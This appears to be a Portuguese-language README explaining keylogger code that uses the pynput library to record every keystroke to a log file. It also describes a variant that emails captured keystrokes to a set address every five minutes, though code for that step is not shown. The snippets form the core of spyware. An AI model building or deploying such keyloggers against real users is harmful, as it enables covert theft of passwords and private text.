# Keylogger
📝 Explicação humana do código

Esse script é um keylogger básico feito com a biblioteca pynput.
A ideia é simples: sempre que o usuário aperta uma tecla, o programa registra isso dentro de um arquivo chamado log.txt.

## 🔍 Parte 1: Lista de teclas a serem ignoradas
```
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl,
    keyboard.Key.ctrl_l,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}
```

Aqui você cria um conjunto com algumas teclas que não fazem sentido serem registradas.
Por exemplo: SHIFT ou CTRL não geram caracteres por si só, então você decide ignorá-las para evitar sujeira no log.
______________________________________

## 🎯 Parte 2: A função principal — on_press

Essa função roda toda vez que qualquer tecla é pressionada.

- Primeiro caso: tecla normal
```
try:
    with open("log.txt", "a", encoding="utf-8") as f:
        f.write(key.char)
```
Se a tecla for um caractere comum (tipo "a", "7", "!" etc.), ela tem um atributo .char.
Então o código simplesmente grava isso no arquivo.
Bem direto ao ponto.

- Segundo caso: tecla especial

Se a tecla NÃO tiver .char, o código cai no except AttributeError.

Aqui você trata teclas como espaço, enter, tab, backspace, esc e por aí vai:
```
if key == keyboard.Key.space:
    f.write(" ")
elif key == keyboard.Key.enter:
    f.write("\n")
elif key == keyboard.Key.tab:
    f.write("\t")
```

Espaço vira um espaço no arquivo

Enter vira uma quebra de linha

Tab vira um tab

Backspace você decidiu simplesmente ignorar (não remove o caractere anterior)

Esc você registra como [ESC] para saber que essa tecla foi usada

Se a tecla estiver na lista de ignoradas (IGNORAR), nada é registrado.

E se for uma tecla especial não tratada (como Key.f5, Key.home, Key.end, etc.), você registra com colchetes, exemplo:
[Key.f1]
______________________________
## 🎧 Parte 3: Iniciando o “ouvinte”
```
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
``` 
Isso inicia o listener do pynput, que fica rodando indefinidamente, chamando on_press() sempre que o usuário pressiona uma tecla.


# Keylogger Email

Explicação do código

Esse script é um keylogger com envio automático por e-mail.
Ou seja: ele registra tudo o que a pessoa digita e, a cada 5 minutos, envia o conteúdo capturado para um e-mail específico.

Você dividiu o código em duas partes importantes:

Capturar as teclas

Enviar tudo por e-mail periodicamente

A lógica geral está boa — a ideia está clara e faz sentido. Vamos por partes.

<img width="948" height="299" alt="image" src="https://github.com/user-attachments/assets/11dd4c41-c4dc-48ed-8a0c-e0a10d69226c" />
